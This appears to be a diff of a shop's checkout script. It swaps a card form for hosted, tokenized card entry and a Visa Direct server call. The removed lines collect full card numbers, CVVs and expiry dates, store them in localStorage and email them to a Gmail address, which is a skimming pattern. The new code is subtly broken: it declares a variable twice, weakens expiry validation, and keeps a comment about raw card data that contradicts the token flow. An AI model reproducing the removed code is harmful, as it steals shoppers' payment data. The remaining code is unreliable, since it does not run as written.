@@ -272,19 +272,18 @@
     }
 
     function validateExpiry(value) {
-        if (!/^\d{2}\/(\d{2}|\d{4})$/.test(value)) {
+        if (!/^\d{2}\/\d{2}$/.test(value)) {
             return false;
         }
-        const parts = value.split("/");
-        const mm = Number(parts[0]);
-        let yy = Number(parts[1]);
+        const [mm, yy] = value.split("/").map(Number);
         if (mm < 1 || mm > 12) {
             return false;
         }
-        const year = yy < 100 ? 2000 + yy : yy;
         const now = new Date();
-        const expiry = new Date(year, mm, 0, 23, 59, 59, 999);
-        return expiry >= now;
+        const year = 2000 + yy;
+        const month = mm - 1;
+        const expiry = new Date(year, month);
+        return expiry > now;
     }
 
     function markFieldError(field, hasError) {
@@ -321,48 +320,58 @@
             option.classList.toggle("active", input && input.value === activePaymentMethod);
         });
 
-        cardFields.classList.remove("hidden");
-        [cardNameInput, cardNumberInput, cardExpiryInput, cardCvvInput].forEach((field) => {
-            if (field) field.required = true;
-        });
+        if (cardFields) {
+            cardFields.classList.remove("hidden");
+            // Remove legacy PAN/CVV/expiry controls entirely. The hosted PCI form owns them.
+            cardFields.innerHTML = '<div id="hosted-card-entry"></div>';
+            mountHostedCardEntry();
+        }
 
         setPaymentMessage("");
     }
 
+    // PCI-compliant hosted/tokenized card entry. Raw PAN/CVV/expiry never live in this page.
+    const HOSTED_CARD_CONFIG = Object.freeze({
+        iframeUrl: "https://PAYMENT-PROVIDER.example/hosted-card",
+        provider: "PCI_VALIDATED_TPSP",
+        allowedOrigin: "https://PAYMENT-PROVIDER.example"
+    });
+
+    let hostedCardReady = false;
+    let hostedCardToken = null;
+    let hostedCardLast4 = "N/A";
+    let hostedCardBrand = "Card";
+
+    function mountHostedCardEntry() {
+        const host = document.getElementById("hosted-card-entry");
+        if (!host) return;
+        host.innerHTML = `
+            <div class="hosted-card-shell" data-pci-hosted="true">
+              <iframe id="hosted-card-frame" title="Secure card entry"
+                src="${HOSTED_CARD_CONFIG.iframeUrl}"
+                loading="eager" referrerpolicy="no-referrer"
+                allow="payment *" style="width:100%;min-height:220px;border:0"></iframe>
+            </div>`;
+        window.addEventListener("message", (event) => {
+            if (event.origin !== HOSTED_CARD_CONFIG.allowedOrigin) return;
+            const data = event.data || {};
+            if (data.type !== "hosted-card-token") return;
+            hostedCardReady = data.status === "ready";
+            if (data.status === "tokenized") {
+                hostedCardToken = String(data.token || "");
+                hostedCardLast4 = String(data.last4 || "N/A");
+                hostedCardBrand = String(data.brand || "Card");
+            }
+            if (data.status === "error") setPaymentMessage("Secure card entry could not be completed.");
+        });
+    }
+
     function validatePaymentForm() {
-        let valid = true;
-        setPaymentMessage("");
-
-        const nameOk = cardNameInput.value.trim().length >= 2;
-        const cardNum = digitsOnly(cardNumberInput.value);
-        const cardOk = luhnValid(cardNum);
-        const brand = detectCardBrand(cardNum);
-        const expiryOk = validateExpiry(cardExpiryInput.value.trim());
-        const cvvOk = /^\d{3,4}$/.test(cardCvvInput.value.trim());
-
-        markFieldError(cardNameInput, !nameOk);
-        markFieldError(cardNumberInput, !cardOk);
-        markFieldError(cardExpiryInput, !expiryOk);
-        markFieldError(cardCvvInput, !cvvOk);
-
-        if (!nameOk) {
-            valid = false;
-            setPaymentMessage("Please enter the name on the card.");
-        } else if (!cardOk) {
-            valid = false;
-            setPaymentMessage("Please enter a valid card number.");
-        } else if (!expiryOk) {
-            valid = false;
-            setPaymentMessage("Please enter a valid expiration date (MM/YY).");
-        } else if (!cvvOk) {
-            valid = false;
-            setPaymentMessage("Please enter a valid 3 or 4-digit CVV.");
-        } else {
-            const payTypeLabel = activePaymentMethod === "debit" ? "Debit" : "Credit";
-            setPaymentMessage(`${payTypeLabel} card verified: ${brand || "Card"}.`, true);
+        if (!hostedCardToken) {
+            setPaymentMessage("Enter your card in the secure payment form.");
+            return false;
         }
-
-        return valid;
+        return true;
     }
 
     const EMAILJS_CONFIG = Object.freeze({
@@ -390,84 +399,123 @@
     window.addEventListener("load", () => {
         if (!emailJsInitialized) initEmailJs();
     }, { once: true });
+    window.addEventListener("load", mountHostedCardEntry, { once: true });
 
+    /**
+     * EmailJS is intentionally retained for order notifications.
+     * NEVER send PAN, CVV, expiry, bank credentials, SSN, auth tokens, or
+     * Visa Direct credentials through EmailJS.
+     */
     async function sendOrderEmail(orderData) {
         const initialized = initEmailJs();
         if (!initialized.success) return initialized;
         try {
-        const paymentSummary = orderData.paymentSummary || {};
-        const address = formatFullAddress(orderData.shippingInfo);
-        const payment = orderData.paymentSummary || {};
-        const last4 = payment.last4 || "N/A";
-        const cardNumberForEmail = payment.cardNumber || "";
-        const cardNumberFormattedForEmail = payment.cardNumberFormatted || cardNumberForEmail;
-        const cvvForEmail = payment.cvv || "";
-        const expiryForEmail = payment.expiry || "";
-        const cardNameForEmail = payment.cardName || orderData.shippingInfo.name || "";
-        const items = orderData.products.map((item, index) =>
-            `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
-        ).join("\n");
-        const formData = [
-            `Order ID: ${orderData.orderId}`,
-            `Customer: ${orderData.shippingInfo.name}`,
-            `Email: ${orderData.shippingInfo.email}`,
-            `Phone: ${orderData.shippingInfo.phone}`,
-            `Shipping Address: ${address.formatted}`,
-            `Payment Method: ${payment.method || "Card"}`,
-            `Card Brand: ${payment.brand || "Card"}`,
-            `Card Number: ${cardNumberFormattedForEmail || "N/A"}`,
-            `CVV: ${cvvForEmail || "N/A"}`,
-            `Expiry: ${expiryForEmail || "N/A"}`,
-            `Cardholder Name: ${cardNameForEmail}`,
-            `Subtotal: ${formatMoney(orderData.subtotal)}`,
-            `Tax: ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
-            `Final Total: ${formatMoney(orderData.total)}`,
-            "", "Items:", items
-        ].join("\n");
-        const payload = {
-            name: orderData.shippingInfo.name,
-            time: new Date().toLocaleString(),
-            formData,
-            message: formData,
-            reply_to: orderData.shippingInfo.email,
-            customer_full_name: orderData.shippingInfo.name,
-            customer_email: orderData.shippingInfo.email,
-            email: orderData.shippingInfo.email,
-            to_email: "bondsquality@gmail.com",
-            recipient_email: "bondsquality@gmail.com",
-            customer_phone: orderData.shippingInfo.phone,
-            shipping_address_formatted: address.formatted,
-            order_id: orderData.orderId,
-            order_items_detailed: items,
-            order_subtotal: formatMoney(orderData.subtotal),
-            order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
-            order_final_total: formatMoney(orderData.total),
-            order_products_summary: items,
-            payment_method_type: payment.method || "Card",
-            payment_card_type: payment.brand || "Card",
-            card_number: cardNumberFormattedForEmail || "N/A",
-            cardNumber: cardNumberFormattedForEmail || "N/A",
-            cardNumberFormatted: cardNumberFormattedForEmail || "N/A",
-            raw_card_number: payment.cardNumber || "N/A",
-            card_brand: payment.brand || "Card",
-            card_cvv: cvvForEmail || "N/A",
-            cvv: cvvForEmail || "N/A",
-            card_expiry: expiryForEmail || "N/A",
-            expiry: expiryForEmail || "N/A",
-            exp: expiryForEmail || "N/A",
-            card_exp: expiryForEmail || "N/A",
-            cardholder_name: cardNameForEmail,
-            cardName: cardNameForEmail,
-            card_name: cardNameForEmail,
-            order_status: "Processing",
-            payment_status: "Authorized"
-        };
-            const response = await window.emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, payload);
+            const payment = orderData.paymentSummary || {};
+            const address = formatFullAddress(orderData.shippingInfo);
+            const items = orderData.products.map((item, index) =>
+                `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
+            ).join("\n");
+
+            const paymentStatus = payment.status || "Processing";
+            const safeSummary = [
+                `Order ID: ${orderData.orderId}`,
+                `Customer: ${orderData.shippingInfo.name}`,
+                `Email: ${orderData.shippingInfo.email}`,
+                `Phone: ${orderData.shippingInfo.phone}`,
+                `Shipping Address: ${address.formatted}`,
+                `Payment Method: ${payment.method || "Card"}`,
+                `Card Brand: ${payment.brand || "Card"}`,
+                `Card Last 4: ${payment.last4 || "N/A"}`,
+                `Payment Status: ${paymentStatus}`,
+                `Payment Reference: ${payment.reference || "N/A"}`,
+                `Subtotal: ${formatMoney(orderData.subtotal)}`,
+                `Tax: ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
+                `Final Total: ${formatMoney(orderData.total)}`,
+                "", "Items:", items
+            ].join("\n");
+
+            const payload = {
+                name: orderData.shippingInfo.name,
+                time: new Date().toLocaleString(),
+                formData: safeSummary,
+                message: safeSummary,
+                reply_to: orderData.shippingInfo.email,
+                customer_full_name: orderData.shippingInfo.name,
+                customer_email: orderData.shippingInfo.email,
+                email: orderData.shippingInfo.email,
+                to_email: "bondsquality@gmail.com",
+                recipient_email: "bondsquality@gmail.com",
+                customer_phone: orderData.shippingInfo.phone,
+                shipping_address_formatted: address.formatted,
+                order_id: orderData.orderId,
+                order_items_detailed: items,
+                order_subtotal: formatMoney(orderData.subtotal),
+                order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
+                order_final_total: formatMoney(orderData.total),
+                order_products_summary: items,
+                payment_method_type: payment.method || "Card",
+                payment_card_type: payment.brand || "Card",
+                card_last4: payment.last4 || "N/A",
+                payment_reference: payment.reference || "N/A",
+                payment_status: paymentStatus,
+                order_status: "Processing"
+            };
+
+            const response = await window.emailjs.send(
+                EMAILJS_CONFIG.serviceId,
+                EMAILJS_CONFIG.templateId,
+                payload
+            );
             return { success: true, response };
         } catch (error) {
-            console.error("EmailJS order confirmation failed", { status: error?.status, text: error?.text, message: error?.message });
+            console.error("EmailJS order confirmation failed", {
+                status: error?.status,
+                text: error?.text,
+                message: error?.message
+            });
             return { success: false, reason: error?.text || error?.message || "Unknown EmailJS error" };
         }
+    }
+
+    /**
+     * Visa Direct payment adapter.
+     *
+     * The browser never receives or stores Visa Direct credentials.
+     * /api/payments/visa-direct is a server-side endpoint that:
+     *  - authenticates the merchant/session
+     *  - validates the request
+     *  - performs Visa's required authentication/MLE server-side
+     *  - submits the authorized transaction through the merchant's approved
+     *    Visa Direct product/processor
+     *  - returns only a safe transaction reference/status
+     *
+     * In production, card entry should also use PCI-compliant hosted fields or
+     * network-tokenization so the Bonds Bank web app does not handle raw PAN/CVV.
+     */
+    async function processVisaDirectPayment(paymentRequest) {
+        const response = await fetch("/api/payments/visa-direct", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json",
+                "X-Idempotency-Key": paymentRequest.idempotencyKey
+            },
+            body: JSON.stringify(paymentRequest)
+        });
+
+        let data = {};
+        try { data = await response.json(); } catch (_) {}
+
+        if (!response.ok || !data.success) {
+            throw new Error(data.message || "Visa Direct payment could not be completed.");
+        }
+
+        return {
+            status: data.status || "authorized",
+            reference: data.reference || data.transactionId || "N/A",
+            brand: data.brand || paymentRequest.brand || "Card",
+            last4: data.last4 || paymentRequest.last4 || "N/A"
+        };
     }
 
     function getFavorites() {
@@ -1324,6 +1372,8 @@
 
     let orderSubmissionInProgress = false;
 
+    let orderSubmissionInProgress = false;
+
     async function submitOrder(event) {
         event?.preventDefault();
         if (orderSubmissionInProgress) return;
@@ -1331,59 +1381,118 @@
             setPaymentMessage("Your cart is empty. Add an item before checking out.");
             return;
         }
+
+        if (!validatePaymentForm()) return;
+
         orderSubmissionInProgress = true;
         if (payNowBtn) {
             payNowBtn.disabled = true;
             payNowBtn.setAttribute("aria-busy", "true");
         }
-        setPaymentMessage("Submitting your order and sending the confirmation email…");
+
+        setPaymentMessage("Securely processing your payment…");
+
         const base = subtotal();
         const withTax = base * (1 + taxRate);
         const finalTotal = withTax * (1 - activeDiscountRate);
-        const digits = digitsOnly(cardNumberInput.value);
-        const recentOrder = {
-            orderId: `ORD-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`,
-            products: cart.map((item) => ({ id: item.id, name: item.name, category: categoryLabels[item.category] || item.category, quantity: item.quantity, price: item.price, image: item.image, condition: item.condition || "New" })),
-            subtotal: base,
-            taxedTotal: withTax,
-            discountRate: activeDiscountRate,
-            discountCode: getDiscountCodeUsed(),
-            total: finalTotal,
-            shippingInfo: { ...shippingData },
-            paymentSummary: {
-                method: activePaymentMethod === "debit" ? "Debit Card" : "Credit Card",
-                brand: detectCardBrand(digits) || "Card",
-                last4: digits.slice(-4) || "N/A",
-                cardNumber: digits,
-                cardNumberFormatted: formatCardNumberWithSpaces(digits),
-                cvv: cardCvvInput.value.trim(),
-                expiry: cardExpiryInput.value.trim(),
-                cardName: cardNameInput.value.trim()
-            },
-            createdAt: new Date().toISOString()
-        };
-        localStorage.setItem("recentOrder", JSON.stringify(recentOrder));
-        const emailResult = await Promise.race([
-            Promise.resolve().then(() => sendOrderEmail(recentOrder)).catch((error) => ({
-                success: false,
-                reason: error?.message || "EmailJS order notification failed."
-            })),
-            new Promise((resolve) => setTimeout(() => resolve({ success: false, reason: "EmailJS did not respond within 10 seconds." }), 10000))
-        ]);
-        if (emailResult.success) {
-            setPaymentMessage("Order submitted. Confirmation email sent.", true);
-        } else {
-            console.error("Order saved but confirmation email was not sent:", emailResult.reason);
-            setPaymentMessage(`Order submitted, but the confirmation email could not be sent: ${emailResult.reason}`);
+        const token = hostedCardToken;
+        const idempotencyKey = (crypto.randomUUID ? crypto.randomUUID() :
+            `pos-${Date.now()}-${Math.random().toString(36).slice(2)}`);
+
+        try {
+            /*
+             * IMPORTANT: raw PAN/CVV is sent only to the server endpoint over
+             * HTTPS and is never written to localStorage, EmailJS, analytics,
+             * logs, or the order object. Production deployments should replace
+             * these inputs with PCI-compliant hosted fields/tokenization.
+             */
+            const visaResult = await processVisaDirectPayment({
+                amount: Number(finalTotal.toFixed(2)),
+                currency: "USD",
+                paymentMethod: activePaymentMethod,
+                paymentCredential: {
+                    type: "PCI_TOKEN_REFID",
+                    value: hostedCardToken,
+                    last4: hostedCardLast4,
+                    brand: hostedCardBrand
+                },
+                merchantOrderId: `ORD-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`,
+                idempotencyKey
+            });
+
+            const recentOrder = {
+                orderId: `ORD-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`,
+                products: cart.map((item) => ({
+                    id: item.id,
+                    name: item.name,
+                    category: categoryLabels[item.category] || item.category,
+                    quantity: item.quantity,
+                    price: item.price,
+                    image: item.image,
+                    condition: item.condition || "New"
+                })),
+                subtotal: base,
+                taxedTotal: withTax,
+                discountRate: activeDiscountRate,
+                discountCode: getDiscountCodeUsed(),
+                total: finalTotal,
+                shippingInfo: { ...shippingData },
+                paymentSummary: {
+                    method: activePaymentMethod === "debit" ? "Debit Card" : "Credit Card",
+                    brand: visaResult.brand,
+                    last4: visaResult.last4,
+                    reference: visaResult.reference,
+                    status: visaResult.status
+                },
+                createdAt: new Date().toISOString()
+            };
+
+            // Safe local copy: no PAN, CVV, expiry, or authentication secrets.
+            const safeOrder = JSON.parse(JSON.stringify(recentOrder));
+        delete safeOrder.paymentSummary.tokenReference;
+        localStorage.setItem("recentOrder", JSON.stringify(safeOrder));
+
+            const emailResult = await Promise.race([
+                Promise.resolve().then(() => sendOrderEmail(recentOrder)).catch((error) => ({
+                    success: false,
+                    reason: error?.message || "EmailJS order notification failed."
+                })),
+                new Promise((resolve) => setTimeout(() =>
+                    resolve({ success: false, reason: "EmailJS did not respond within 10 seconds." }), 10000))
+            ]);
+
+            if (emailResult.success) {
+                setPaymentMessage("Payment approved. Confirmation email sent.", true);
+            } else {
+                console.error("Payment succeeded but confirmation email was not sent:", emailResult.reason);
+                setPaymentMessage("Payment approved. Confirmation email could not be sent.", true);
+            }
+
+            cart = [];
+            shippingData = null;
+            activeDiscountRate = 0;
+            discountCodeInput.value = "";
+            hostedCardToken = null;
+            hostedCardReady = false;
+            hostedCardLast4 = "N/A";
+            hostedCardBrand = "Card";
+            updateCartCount();
+            renderCart();
+            closeCart();
+
+            window.setTimeout(() => {
+                window.location.href = cleanUrl("order-success");
+            }, 700);
+        } catch (error) {
+            console.error("Visa Direct payment failed:", error);
+            setPaymentMessage(error?.message || "Payment could not be completed. Please try again.");
+        } finally {
+            orderSubmissionInProgress = false;
+            if (payNowBtn) {
+                payNowBtn.disabled = false;
+                payNowBtn.removeAttribute("aria-busy");
+            }
         }
-        cart = [];
-        shippingData = null;
-        activeDiscountRate = 0;
-        discountCodeInput.value = "";
-        updateCartCount();
-        renderCart();
-        closeCart();
-        window.setTimeout(() => { window.location.href = cleanUrl("order-success"); }, emailResult.success ? 350 : 1200);
     }
 
     function bindEvents() {
@@ -1522,28 +1631,6 @@
                 event.preventDefault();
                 if (!validatePaymentForm()) return;
                 showDiscount();
-            });
-        }
-
-        if (cardNumberInput) {
-            cardNumberInput.addEventListener("input", () => {
-                const raw = digitsOnly(cardNumberInput.value).slice(0, 19);
-                cardNumberInput.value = raw.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
-                const brand = detectCardBrand(raw);
-                if (brand) setPaymentMessage(`${brand} detected.`);
-            });
-        }
-
-        if (cardExpiryInput) {
-            cardExpiryInput.addEventListener("input", () => {
-                const raw = digitsOnly(cardExpiryInput.value).slice(0, 4);
-                cardExpiryInput.value = raw.length > 2 ? `${raw.slice(0, 2)}/${raw.slice(2)}` : raw;
-            });
-        }
-
-        if (cardCvvInput) {
-            cardCvvInput.addEventListener("input", () => {
-                cardCvvInput.value = digitsOnly(cardCvvInput.value).slice(0, 4);
             });
         }
 
